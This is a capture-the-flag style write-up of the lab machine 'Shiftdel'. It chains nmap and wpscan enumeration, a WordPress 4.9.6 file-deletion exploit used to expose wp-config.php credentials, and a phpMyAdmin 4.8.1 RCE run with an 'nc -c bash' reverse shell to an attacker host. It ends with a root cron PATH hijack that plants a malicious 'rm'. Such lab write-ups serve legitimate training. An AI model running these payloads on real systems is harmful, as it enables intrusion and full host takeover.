#### Enumeration

```
# Nmap 7.91 scan initiated Sat Jan  1 23:01:45 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Shiftdel/AutoRecon/results/192.168.188.174/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Shiftdel/AutoRecon/results/192.168.188.174/scans/xml/_full_tcp_nmap.xml 192.168.188.174
Increasing send delay for 192.168.188.174 from 0 to 5 due to 1073 out of 2682 dropped probes since last increase.
Nmap scan report for 192.168.188.174
Host is up, received user-set (0.20s latency).
Scanned at 2022-01-01 23:01:46 EST for 926s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 4.9.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Shiftdel
8888/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
|_http-favicon: Unknown favicon MD5: 531B63A51234BB06C9D77F219EB25553
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: phpMyAdmin
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.32 or 3.10 (91%), Linux 3.5 (91%), Linux 4.4 (91%), WatchGuard Fireware 11.8 (91%), Synology DiskStation Manager 5.1 (90%), Linux 2.6.35 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 4.2 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/1%OT=22%CT=1%CU=39295%PV=Y%DS=2%DC=T%G=Y%TM=61D12748
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=106%TI=Z%II=I%TS=A)OPS(O1=M50
OS:6ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6
OS:=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF
OS:=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 37.409 days (since Thu Nov 25 13:28:47 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   213.85 ms 192.168.49.1
2   215.24 ms 192.168.188.174

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  1 23:17:12 2022 -- 1 IP address (1 host up) scanned in 928.53 seconds

```

Acroding to the nmap scan results, we can confirm that wordpress is running on 80 port and version is ```4.9.6```. Using wpscan tool to check vulnerabilities. 
We found two accounts admin and intern but did not find plugins and themes vulnerability.

```
wpscan --url http://192.168.242.174 -e vt,vp,u1-10
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.04_21h38m17s_001.png)

After a lot of searching, I found a vulnerability in [wordpress core](https://www.exploit-db.com/exploits/47690). We can find hidden articles by browsing the vulnerability URL. One of the articles provides the password for the ```intern``` account.

```http://192.168.169.174/?static=1&order=asc```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.11_01h09m45s_002.png)

When I was looking for wordpress vulnerability, I also found another [wordpress 4.9.6 vulnerability](https://www.exploit-db.com/exploits/50456), but it requires a verified account, so the credential We got early can be used here.

On the other hand, the site running at port 8888 is phpMyAdmin 4.8.1. After searching, I found an available [RCE](https://www.exploit-db.com/exploits/50457) but it requires an authenticated account.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h0m16s_003.png)

So we now use the aforementioned exploit to try to reset the wordpress database settings.

We follow the [exploit](https://www.exploit-db.com/exploits/50456) steps. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h12m33s_004.png)

1. Login in to wordpress admin.

2. Navigates to Media > Add New > Select Files > Open/Upload

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h18m0s_005.png)

3. Click Edit > Open Developer Console > Paste this exploit script (If you can't copy and paste the js function code in the console enter ```allow pasting``` first )

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h45m9s_006.png)

4. Execute the function, eg: unlink_thumb("../../../../wp-config.php")

We can't reset the settings because wp-config-sample.php is missing.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_18h32m38s_007.png)

After referring to this [article](https://blog.sonarsource.com/wordpress-file-delete-to-code-execution?redirect=rips) and doing some researching I try to delete ```.htaccess``` to remove protection settings.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_18h47m43s_008.png)

We can see the source code directly.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_18h49m31s_009.png)

We know that wp-config.php contains the database connection settings, so we browse to wp-config.php page but it doesn't show any information, then I try to check the code
and get the settings successfully.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_19h43m2s_010.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_19h43m22s_011.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_19h44m0s_012.png)

Right now we have the database connection information, we can use the previous [RCE](https://www.exploit-db.com/exploits/50457) to get the shell.

```
python3 50457.py 192.168.227.174 8888 / wordpress ThinnerATheWaistline348 "nc -c bash 192.168.49.227 80"
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h11m17s_013.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h12m58s_014.png)

#### Privilege Escalation

After searching for a while I found a schedule ```wpclean``` has customizing $HOME path and run by root. (hijacking PATH)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h22m7s_015.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h34m13s_016.png)

We create a ```rm``` flile under ```/bin``` path.

```
cd /var/www/html/wordpress/wp-content/uploads/
mkdir bin
cd bin
echo "nc -c bash 192.168.49.227 80" > rm
chmod +x rm
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_21h9m34s_017.png)

Waiting for a few minutes, we get a shell.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_21h10m36s_018.png)

